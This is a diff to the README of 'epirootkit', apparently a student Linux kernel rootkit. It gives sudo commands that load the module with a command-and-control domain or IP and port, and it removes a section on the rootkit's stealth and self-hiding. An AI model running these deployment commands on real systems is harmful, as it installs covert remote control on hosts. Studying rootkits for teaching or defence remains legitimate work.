@@ -64,7 +64,7 @@ file epirootkit.ko
 ### Method 1: Deployment Script (Recommended)
 ```bash
 # Deploy with domain name
-sudo ./deploy_rootkit.sh address=c2.example.com
+sudo ./deploy_rootkit.sh address=jules_chef_de_majeur.epirootkit.com
 
 # Deploy with IP address
 sudo ./deploy_rootkit.sh address=192.168.1.100 port=4444
@@ -84,7 +84,7 @@ sudo ./deploy_rootkit.sh
 ### Method 2: Manual Loading
 ```bash
 # Load with domain
-sudo insmod epirootkit.ko address=c2.example.com port=443
+sudo insmod epirootkit.ko address=jules_chef_de_majeur.epirootkit.com
 
 # Load with IP
 sudo insmod epirootkit.ko address=192.168.1.100 port=4444
@@ -105,15 +105,6 @@ ls -la /sys/module/epirootkit
 
 ```
 
-### Module Status
-Since verbose logging has been removed for stealth operation, the rootkit operates silently. 
-
-**Successful loading indicators:**
-- Module appears in `/sys/module/epirootkit/` (unless hidden)
-- No critical errors in `dmesg`
-- C2 server receives connection from new client
-
-**Note:** Operational logs have been removed to maintain stealth - the rootkit operates silently with minimal traces.
 
 ## Domain Support
 
